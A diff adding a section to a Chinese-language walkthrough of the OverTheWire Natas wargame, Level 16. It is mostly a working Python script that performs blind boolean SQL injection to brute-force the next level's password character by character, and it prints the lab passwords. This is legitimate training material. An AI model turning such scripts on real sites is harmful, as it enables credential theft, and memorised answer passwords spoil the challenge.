@@ -255,5 +255,60 @@ echo $content;
 密码为 `GB6USCJYJjwLyYhZUNkE1NwDueiTow6g`
 
 ## Level 16
+依旧 sql 注入，但这次前端只会返回真假值，暴力枚举密码的每一位即可：
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+import string
+from string import Template
+
+def ret_true(text):
+    return "This user exists." in text
 
 
+def ret_err(text):
+    return "Error in query." in text
+
+url = "http://natas15.natas.labs.overthewire.org/"
+
+username = "natas15"
+password = "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"
+
+auth = HTTPBasicAuth(username, password)
+
+# data = {"username": "natas16"}
+
+# response = requests.post(url, data=data, auth=auth)
+
+ALPHABET = string.ascii_letters + string.digits
+# $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+SQL_TEMPLATE = Template(r'natas16" and password like BINARY "${curPass}${enumChar}%')
+
+def enumChars(currentPass):
+    for c in ALPHABET:
+        sql = SQL_TEMPLATE.substitute(curPass=currentPass, enumChar=c)
+        data = {"username": sql}
+        print(f"cur: {currentPass} enum: {c}\ndata: {data}")
+        response = requests.post(url, data=data, auth=auth)
+
+        if ret_err(response.text):
+            print("ERROR!")
+            exit(1)
+
+        if ret_true(response.text):
+            return c
+    return None
+
+currentPass = ""
+while True:
+    c = enumChars(currentPass)
+    if c is None:
+        break
+    currentPass += c
+print(currentPass)
+```
+实际上这样枚举效率非常低，可以考虑逐字符二分。不过这样也勉强够用。
+
+密码为 `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`
+
+## Level 17
